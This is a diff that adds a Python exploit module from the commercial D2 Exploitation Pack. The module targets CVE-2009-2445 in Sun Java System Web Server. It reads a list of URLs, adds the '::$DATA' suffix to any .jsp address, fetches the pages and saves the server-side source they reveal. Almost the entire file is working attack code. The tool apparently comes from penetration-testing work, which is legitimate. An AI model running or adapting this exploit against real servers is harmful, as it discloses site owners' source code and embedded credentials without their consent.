@@ -1,0 +1,131 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license 
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2009
+#
+
+import os
+import sys
+import string
+
+sys.path.append('.')
+sys.path.append(os.getcwd() + '/3rdparty/D2SEC/libs')
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+from urllib2 import Request, urlopen
+
+NAME = 'File Disclosure Generic Web Exploit'
+DESCRIPTION = 'Exploit File Information Disclosure Vulnerabilities'
+VERSION = '0.1'
+
+DOCUMENTATION={}
+DOCUMENTATION['References'] = ''
+DOCUMENTATION['Repeatability'] = 'Infinite'
+DOCUMENTATION['Vulnerabilities'] = """
+
+===============================================================================
+1. Sun Java System Web Server File Information Disclosure
+CVE Name: CVE-2009-2445
+CVE Url: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2445
+===============================================================================
+
+"""
+
+DOCUMENTATION["Notes"] = """
+This is a generic exploit to exploit file information disclosure
+vulnerabilities. You must to give a urls list file, created with
+d2sec_modules/All/d2sec_proxy for example.
+"""
+
+PROPERTY = {}
+PROPERTY['TYPE'] = 'Web Exploits'
+PROPERTY['SITE'] = 'Remote'
+
+VULNS = {}
+VULNS['CVE-2009-2445'] = ['Sun Java System Web Server File Information Disclosure', '.jsp', '::$DATA']
+
+class theexploit(tcpexploit):
+	def __init__(self):
+		tcpexploit.__init__(self)        
+		self.name = NAME
+		self.urlfile = ""
+		return
+
+	def getArgs(self):
+		self.urlfile = self.argsDict.get("urlfile",self.urlfile)
+		if self.urlfile:
+			try:
+				os.stat(self.urlfile)
+			except:
+				self.log("[D2 LOG] %s file not found" % self.urlfile)
+				return 1
+		return 0
+    
+	def visit(self, url):
+		req = Request(url)
+		try:
+			handle = urlopen(req)
+		except IOError, e:
+			if hasattr(e, 'reason'):
+				self.log("Can't joined server: %s" % e.reason)
+				return None
+			elif hasattr(e, 'code'):
+				self.log("Error code: %s" % e.code)
+				return None
+		else:
+			return handle.read()
+
+	def savepage(self, cve, vuln, url, file, page, resources):
+		res = resources+"/%s"%file
+		while os.path.exists(res):
+			file = file+"_1"
+			res = resources+"/%s"%file
+
+		f = open(res, 'w')
+		f.write("[+] %s\n" % vuln)
+		f.write("[+] %s\n" % cve)
+		f.write("[+] %s\n\n" % url)
+		f.write("-"*72+"\n\n")
+		f.write(page)
+		f.close()
+		self.log("[D2 LOG] Resources/d2sec_filedisclo/%s created" % file) 
+
+	def run(self):
+
+		if self.getArgs():
+			self.setInfo('[D2 LOG] %s exploit - done (failed)' % NAME)
+			return 0
+
+		resources = os.getcwd() + '/3rdparty/D2SEC/Resources/d2sec_filedisclo' 
+
+		self.log('[D2 LOG] %s' % NAME)
+		self.setInfo('[D2 LOG] %s running' % NAME, self.host)
+
+		if not os.path.isdir(resources):
+			os.mkdir(resources)
+		
+		urls = open(self.urlfile, 'r').readlines()
+		for url in urls:
+			file = os.path.basename(url)[:-1]
+			for cve, vuln in VULNS.items():
+				if vuln[1] not in url.lower():
+					continue
+				url = url[:-1]+vuln[2]
+				page = self.visit(url)
+				if page:
+					self.savepage(cve, vuln[0], url, file, page, resources)
+		
+		self.setInfo('[D2 LOG] %s exploit - done' % NAME)
+		return 1
+
+	def usage(self):
+		print 'Usage: %s -O urlfile:<filename>' % (sys.argv[0])
+		sys.exit(0)
+
+if __name__=='__main__':
+	app = theexploit()
+	ret = standard_callback_commandline(app)
